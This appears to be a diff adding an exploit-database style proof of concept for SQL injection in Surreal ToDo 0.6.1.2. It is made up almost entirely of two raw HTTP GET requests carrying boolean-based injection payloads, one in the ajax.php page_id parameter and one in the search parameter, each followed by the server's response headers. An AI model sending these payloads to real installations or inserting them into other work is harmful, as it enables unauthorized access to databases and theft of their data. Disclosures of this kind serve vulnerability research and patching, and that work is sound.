@@ -1,0 +1,50 @@
+# Exploit Title: Surreal ToDo 0.6.1.2 - SQL Injection
+# Dork: N/A
+# Date: 2018-11-08
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://getsurreal.com/surrealtodo
+# Software Link: https://netcologne.dl.sourceforge.net/project/surrealtodo/Surreal%20ToDo/surrealtodo_v0.6.1.2.zip
+# Version: 0.6.1.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/ajax.php?action=lists&page_id=[SQL]
+# 
+GET /[PATH]/ajax.php?action=lists&page_id=1%20AND%201=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 07 Nov 2018 23:41:43 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1783
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/search=[SQL]
+# 
+GET /[PATH]/?search=%27%20AND%201=1%20AND%20%27Efe%27%20LIKE%20%27Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 07 Nov 2018 23:44:26 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 5284
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
